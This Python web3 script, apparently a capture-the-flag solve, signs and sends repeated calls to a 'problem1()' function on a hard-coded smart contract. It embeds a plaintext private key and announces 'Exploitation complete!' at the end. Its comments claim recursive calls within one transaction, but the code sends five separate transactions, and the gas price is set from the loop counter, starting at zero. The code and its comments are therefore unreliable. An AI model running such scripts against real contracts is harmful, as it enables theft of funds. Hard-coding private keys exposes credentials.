from web3 import Web3

# Initialize web3 instance
web3 = Web3(Web3.HTTPProvider("http://143.215.130.235:8545")) # Insert your RPC URL here

# Define contract address
contract_address = "0x3c130a477E170E1eB5EC334E0A4e01D26ab7a2eB"
caller = "0x1D95c52ec00fce1c4E86f56a26Df021D96451A90"
private_key = "003cb618783a20afec4b5eb7911545c58d9d67be49ca93280a1bac05052678f8"

# Define the function selector for problem1
function_selector = Web3.keccak(text="problem1()").hex()[:10]

# Define the transaction data
transaction_data = function_selector

# Create a loop to recursively call the function multiple times within the same transaction
for _ in range(5):  # Change the range as needed for the number of recursive calls
    # Create a raw transaction
    raw_transaction = {
        "to": contract_address,
        # "value": web3.to_wei(1, "ether"),  # Send 1 ether with each call
        "gas": 1000000,  # Adjust gas limit as needed
        "gasPrice": web3.to_wei(_, "gwei"),  # Adjust gas price as needed
        "nonce": web3.eth.get_transaction_count(caller),
        "data": transaction_data,
        "chainId": web3.eth.chain_id
    }

    # Sign the raw transaction
    signed_txn = web3.eth.account.sign_transaction(raw_transaction, private_key=private_key)

    # Send the raw transaction
    tx_hash = web3.eth.send_raw_transaction(signed_txn.rawTransaction)

    # Wait for transaction receipt
    tx_receipt = web3.eth.wait_for_transaction_receipt(tx_hash)

    print(f"Transaction {tx_receipt.transactionHash.hex()} successful!")

print("Exploitation complete!")
